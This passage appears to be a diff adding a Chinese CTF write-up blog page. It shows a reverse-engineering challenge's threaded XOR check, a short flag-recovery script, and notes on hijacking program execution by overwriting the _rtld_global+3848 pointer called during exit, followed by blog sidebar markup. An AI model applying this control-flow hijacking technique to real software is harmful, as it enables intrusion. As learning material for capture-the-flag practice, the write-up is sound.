class="built_in">print</span>(<span class="string">&quot;flag to &#x27;ord&#x27;:&quot;</span>, flag)</span><br><span class="line">t1 = threading.Thread(encode_1, (<span class="number">1</span>,), **(<span class="string">&#x27;target&#x27;</span>, <span class="string">&#x27;args&#x27;</span>))</span><br><span class="line">t2 = threading.Thread(encode_2, (<span class="number">2</span>,), **(<span class="string">&#x27;target&#x27;</span>, <span class="string">&#x27;args&#x27;</span>))</span><br><span class="line">t1.start()</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">t2.start()</span><br><span class="line">t1.join()</span><br><span class="line">t2.join()</span><br><span class="line"><span class="keyword">if</span> flag == Happy:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Good job!&#x27;</span>)</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;No no no!&#x27;</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+
+<p>大致意思就是开了两个线程，对输入每隔1s进行不同的操作，然后最后结果是Happy数组。逆回去也很简单，脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">flag = [</span><br><span class="line">    <span class="number">44</span>,</span><br><span class="line">    <span class="number">100</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    <span class="number">50</span>,</span><br><span class="line">    <span class="number">106</span>,</span><br><span class="line">    <span class="number">90</span>,</span><br><span class="line">    <span class="number">5</span>,</span><br><span class="line">    <span class="number">102</span>,</span><br><span class="line">    <span class="number">10</span>,</span><br><span class="line">    <span class="number">112</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]^i),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]^flag[i+<span class="number">1</span>]),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>结果如图</p>
+<img src="https://c2.im5i.com/2022/01/08/UdliW.png" style="zoom:80%;" />
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>今天收获还蛮多的，虽然不怎么会 <code>off-by-null</code>，但网上找了个模板就直接出了，具体细节还得动调复盘下，pwn3对&lt;_rtld_global+3848&gt; 的利用也是经师傅指点才知道，也需复盘。不过今天打得有些累了，明天再整理一下题目的细节好了。</p>
+<hr>
+<h2 id="复盘更新"><a href="#复盘更新" class="headerlink" title="复盘更新"></a>复盘更新</h2><p>关于 <code>exit</code> 对 &lt;_rtld_global+3848&gt; 的调用，直接动调步进 <code>exit</code> 函数，关键代码段如下。</p>
+<img src="https://c2.im5i.com/2022/01/09/Uf4aP.png" style="zoom:80%;" />
+
+<p>看一下 rdx&lt;0x7f0c647c9af0&gt; 里面的主要代码，发现确实调用了 &lt;_rtld_global+3848&gt; 处，因此只要修改该处，便能劫持程序的执行流。</p>
+<p>其实这道题，一开始我的思路是将 exit 函数处的第一句代码汇编改为 <code>call one_gadget</code> 的形式，但后来意识到 libc 上没有写的权限。这道题便很好的打开了思路——<strong>就是步进，去底层找该函数对某个特定地址的调用，修改该处的地址同样也可以劫持程序执行流</strong>。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/01/04/peach/" rel="prev" title="peach学习及在web领域的应用">
+      <i class="fa fa-chevron-left"></i> peach学习及在web领域的应用
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/01/24/hgame2022/" rel="next" title="hgame2022">
+      hgame2022 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-number">1.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PWN1"><span class="nav-number">1.1.</span> <span class="nav-text">PWN1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PWN2"><span class="nav-number">1.2.</span> <span class="nav-text">PWN2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PWN3"><span class="nav-number">1.3.</span> <span class="nav-text">PWN3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RE"><span class="nav-number">2.</span> <span class="nav-text">RE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RE1"><span class="nav-number">2.1.</span> <span class="nav-text">RE1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RE2"><span class="nav-number">2.2.</span> <span class="nav-text">RE2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RE3"><span class="nav-number">2.3.</span> <span class="nav-text">RE3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%9B%98%E6%9B%B4%E6%96%B0"><span class="nav-number">4.</span> <span class="nav-text">复盘更新</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Anza"
+      src="/images/Haida.png">
+  <p class="site-author-name" itemprop="name">Anza</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://verf1sh.github.io/" title="https:&#x2F;&#x2F;verf1sh.github.io&#x2F;" rel="noopener" target="_blank">VerF1sh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://4xwi11.github.io/" title="https:&#x2F;&#x2F;4xwi11.github.io&#x2F;" rel="noopener" target="_blank">4XWi11</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="author" itemprop="copyrightHolder">Anza</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
